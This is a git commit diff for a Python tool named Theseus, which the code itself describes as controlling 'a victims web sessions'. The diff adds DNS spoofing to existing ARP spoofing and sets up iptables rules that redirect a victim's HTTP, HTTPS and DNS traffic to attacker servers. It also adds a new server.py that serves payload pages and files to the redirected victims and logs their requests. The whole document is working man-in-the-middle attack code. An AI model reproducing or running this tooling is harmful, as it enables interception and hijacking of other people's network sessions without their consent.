50fab50998b3b7890691d04acbadb15982ca2ce8
Dylan Halls <Dylan.halls123@gmail.com>
2017-04-08 23:38:47 +0100

    Changed Theseus so that it is now runs in python3. I did this because the DNS spoofing server functioned best in python3 and since that was a vital part I decided to make the change.

--- src/Theseus.py
+++ src/Theseus.py
@@ -3,16 +3,18 @@ import sys
 import socket
 import argparse
 import threading
-import ConfigParser
+import configparser
 import multiprocessing
 from arp.arp import Arp_Spoof
 from arp.ping import Arp_Ping
-from proxy.proxy import HTTP_Proxy, SSL_Proxy
+from banner.banner import New_Banner
+from server.server import HTTP_Server, SSL_Server
+from dns.dns import Decode_Packet, DNS_Server
 
 class Theseus(object):
 	"""Theseus Control A Victims Web Sessions"""
 	def __init__(self):
-		global args, arp, http_proxy, ssl_proxy, local, router, verbose, html_file, cfg, bhttp, bssl
+		global args, arp, http_Server, ssl_Server, local, router, verbose, html_file, cfg, bhttp, bssl, payloads_folder
 		super(Theseus, self).__init__()
 
 		ap = argparse.ArgumentParser(description="Theseus")
@@ -21,20 +23,23 @@ class Theseus(object):
 		args = ap.parse_args()
 
 		sys.stdout.write("[\033[1;34m+\033[00m] Configuring iptables... ")
-		cfg = ConfigParser.RawConfigParser()
+		cfg = configparser.RawConfigParser()
 		cfile = 'theseus.cfg'
 		cfg.read(cfile)
 		ip_forward = cfg.get('IPTables-Settings', 'path_to_ip_forward')
 		rhttp = cfg.get('IPTables-Settings', 'Receive_HTTP_Port')
 		rssl = cfg.get('IPTables-Settings', 'Receive_SSL_Port')
-		bhttp = cfg.get('Proxy-Settings', 'Bind_HTTP_Port')
-		bssl = cfg.get('Proxy-Settings', 'Bind_SSL_Port')
+		bhttp = cfg.get('Server-Settings', 'Bind_HTTP_Port')
+		bssl = cfg.get('Server-Settings', 'Bind_SSL_Port')
+		rdns = cfg.get('IPTables-Settings', 'Receive_DNS_Port')
+		bdns = cfg.get('DNS-Spoof-Settings', 'Bind_DNS_Port')
 		#Configure kernal and iptables for the attack
 		os.popen("{ echo 0 > "+ip_forward+";\
 					iptables --flush;\
 					iptables --flush -t nat;\
 					iptables -t nat -A PREROUTING -p tcp --destination-port "+rhttp+" -j REDIRECT --to-port "+bhttp+";\
-					iptables -t nat -A PREROUTING -p tcp --destination-port "+rssl+" -j REDIRECT --to-port "+bssl+"; }") #Changed IP Forwarding
+					iptables -t nat -A PREROUTING -p tcp --destination-port "+rssl+" -j REDIRECT --to-port "+bssl+";\
+					iptables -t nat -A PREROUTING -p udp --destination-port "+rdns+" -j REDIRECT --to-port "+bdns+"; }") #Changed IP Forwarding
 		sys.stdout.write("done\n")
 
 		# Load Setting From Config file
@@ -42,7 +47,8 @@ class Theseus(object):
 		router = cfg.get('Arp-Spoof-Settings', 'routers_ip_address')
 		local = cfg.get('Theseus-Settings', 'local_ip_address')
 		verbose = cfg.get('Arp-Spoof-Settings', 'verbose')
-		html_file = cfg.get('Proxy-Settings', 'Html_Payload_Path')
+		html_file = cfg.get('Server-Settings', 'Html_Payload_Path')
+		payloads_folder = cfg.get('Server-Settings', 'Payloads_folder')
 		sys.stdout.write("done\n")
 
 		#Handle any possable errors from args
@@ -64,7 +70,23 @@ class Theseus(object):
 			print("\033[1;31mError Opening file\033[00m")
 			exit()
 
-	def attack_arp_to_proxy(self):
+	def dns_spoof(self, dns, *args):
+		redirect_ip = args[0]
+		while True:
+			raw, addr = dns.await_responce()
+			dns.send_reply(addr, raw, redirect_ip)
+
+	def attack_dns_spoof(self):
+		if bool(cfg.get('DNS-Spoof-Settings', 'Running')) == True:
+			dns = DNS_Server()
+			local = cfg.get('Theseus-Settings', 'local_ip_address')
+			jobs = []
+			for i in range(4):
+		   		p = multiprocessing.Process(target=self.dns_spoof, args=(dns, local))
+		   		jobs.append(p)
+		   		p.start()
+
+	def attack_arp_to_content_force_Server(self):
 		if bool(cfg.get('Arp-Spoof-Settings', 'Running')) == True:
 			arp = Arp_Spoof(args.interface)
 
@@ -95,31 +117,35 @@ class Theseus(object):
 			rname = rname.replace('.home', " ")
 			sys.stdout.write("[\033[1;32m+\033[00m] Started attack on {}\n".format(rname))
 
-		if bool(cfg.get('Proxy-Settings', 'Running')) == True:
-			cert = cfg.get('Proxy-Settings', 'SSl_Certificate')
-			key = cfg.get('Proxy-Settings', 'SSl_Key')
+		if bool(cfg.get('Server-Settings', 'Running')) == True:
+			cert = cfg.get('Server-Settings', 'SSl_Certificate')
+			key = cfg.get('Server-Settings', 'SSl_Key')
 
-			http_proxy = HTTP_Proxy(local, int(bhttp), html_file)
-			sys.stdout.write("[\033[1;34m+\033[00m] Started HTTP proxy on port {}\n".format(bhttp))
+			http_Server = HTTP_Server(local, int(bhttp), html_file)
+			sys.stdout.write("[\033[1;34m+\033[00m] Started HTTP Server on port {}\n".format(bhttp))
 			
-			ssl_proxy = SSL_Proxy(local, int(bssl), html_file, cert, key)
-			sys.stdout.write("[\033[1;34m+\033[00m] Started SSL proxy on port {}\n".format(bssl))
+			ssl_Server = SSL_Server(local, int(bssl), html_file, cert, key)
+			sys.stdout.write("[\033[1;34m+\033[00m] Started SSL Server on port {}\n".format(bssl))
 			sys.stdout.write("[\033[1;34m+\033[00m] Attack Ready...\n\n")
 
 			jobs = []
 			for i in range(4):
-		   		p = multiprocessing.Process(target=http_proxy._http_client_handler)
+		   		p = multiprocessing.Process(target=http_Server._http_client_handler, args=(payloads_folder))
 		   		jobs.append(p)
 		   		p.start()
-		   		p2 = multiprocessing.Process(target=ssl_proxy._ssl_client_handler())
+		   		p2 = multiprocessing.Process(target=ssl_Server._ssl_client_handler())
 		   		jobs.append(p2)
 		   		p2.start()
 
 
 if __name__ == '__main__':
-	print("\033[1;3mTheseus v1\033[00m\n")
+	b = New_Banner()
+	sys.stdout.write("\033[1;3m"+b.new()+"\033[00m\n")
 	t = Theseus()
 	try:
-		t.attack_arp_to_proxy()
+		sys.stdout.write("[\033[1;34m+\033[00m] Starting DNS Server... ")
+		t.attack_dns_spoof()
+		sys.stdout.write("done\n")
+		t.attack_arp_to_content_force_Server()
 	except KeyboardInterrupt:
 		exit()
---
+++ src/server/server.py
@@ -0,0 +1,146 @@
+#from OpenSSL import SSL
+import socket
+from user_agents import parse
+import multiprocessing
+import ssl
+import sys
+from datetime import *
+
+class HTTP_Server(object):
+	"""This is the http page spoofing Server"""
+	def __init__(self, bind_address, bind_port, html_file):
+		global http_responce, s, html
+		super(HTTP_Server, self).__init__()
+		with open('Server.log', 'w') as f:
+			f.write('')
+			f.close()
+		#TODO: Change responce content-type to relevant type
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+		try:
+			s.bind((bind_address, bind_port))
+		except socket.error:
+			sys.stdout.write("[\033[1;31m+\033[00m] Port {} already open... can\'t bind\n".format(bind_port))
+			sys.exit(-1)
+		s.listen(5)
+		with open(html_file, 'r') as file:
+			html = file.read()
+			file.close()
+
+	def _http_client_handler(self, *args):
+		payloads_folder = ''.join(list(args))
+		while True:
+			try:
+				sock, addr = s.accept()
+			except KeyboardInterrupt: 
+				exit(1)
+
+			req = sock.recv(1024)
+			data = req.decode('utf-8')
+			with open('Server.log', 'a') as file:
+				file.write(data)
+				file.close()
+
+			#Correctly parse the request line header
+			try:
+				request = data.split('\n', 1)[0]
+				request_line = request.rstrip('\r\n')
+				request_method, path, request_version = request_line.split()
+			except ValueError:
+				pass
+
+			#Parse all the other main headers
+			try:
+				user_agent = data.splitlines()[2]
+				Accept = data.splitlines()[3]
+				Accept_Language = data.splitlines()[4]
+				Accept_Encoding = data.splitlines()[5]
+				Referer = data.splitlines()[6]
+				Connection = data.splitlines()[7]
+				Cache_Control = data.splitlines()[8]
+				ua = parse(user_agent)
+			except IndexError:
+				pass
+
+
+			#Print Status Message
+			print("[ HTTP ]", "[" ,datetime.now(), "]", "[" ,addr[0], "]", "[", str(ua).replace(" / ", '-') ,"]", request)
+
+			#Send File
+			if path == '/':
+				er_resp = """
+HTTP/1.1 200 OK
+Content-Type: text/html
+
+{}
+"""
+				sock.sendall(er_resp.format(html).encode('utf-8'))
+				sock.close()
+			elif path == '/lock.png':
+				err_resp = """
+HTTP/1.1 200 OK
+Content-Type: image/png
+
+""".encode('utf-8')
+				img_png = open(payloads_folder+path, 'rb')
+				img = img_png.read()
+				sock.send(err_resp+img)
+				sock.close()
+			
+			else:
+				try:
+					e_resp = """
+HTTP/1.1 200 OK
+Content-Type: text/html
+
+<link rel="icon" 
+      type="image/png" 
+      href="lock.png">
+
+""".encode('utf-8')
+					with open(payloads_folder+path, 'rb') as file:
+						rfile = file.read()
+						file.close()
+						sock.send(e_resp+rfile)
+						sock.close()
+				except:
+					pass
+
+
+class SSL_Server(object):
+	"""This is the https page spoofing Server"""
+	def __init__(self, bind_address, bind_port, html_file, cert_file, key_file):
+		global ssl_socket, bs
+		super(SSL_Server, self).__init__()
+		context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+		context.load_cert_chain(certfile=cert_file, keyfile=key_file)
+		bs = socket.socket()
+		bs.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+		#print("SSL -->", bind_address, bind_port)
+		bs.bind((bind_address, bind_port))
+		bs.listen(5)
+		with open(html_file, 'r') as file:
+			html = file.read()
+			file.close()
+
+	def _ssl_client_handler(self):
+		while True:
+			try:
+				sock, addr = bs.accept()
+			except KeyboardInterrupt: exit()
+			rec = sock.recv(1024)
+			#Drop SSL Connection Without error
+			sock.send(bytes("200 OK\r\n".encode('utf-8')))
+
+
+if __name__ == '__main__':
+	http_Server = HTTP_Server('192.168.1.115', 9000, 'Payloads/payload.html')
+	ssl_Server = SSL_Server('192.168.1.115', 4444, 'Payloads/payload.html')
+	jobs = []
+	for i in range (4):
+		p = multiprocessing.Process(target=http_Server._http_client_handler)
+		jobs.append(p)
+		p.start()
+		p2 = multiprocessing.Process(target=ssl_Server._ssl_client_handler())
+		jobs.append(p2)
+		p2.start()
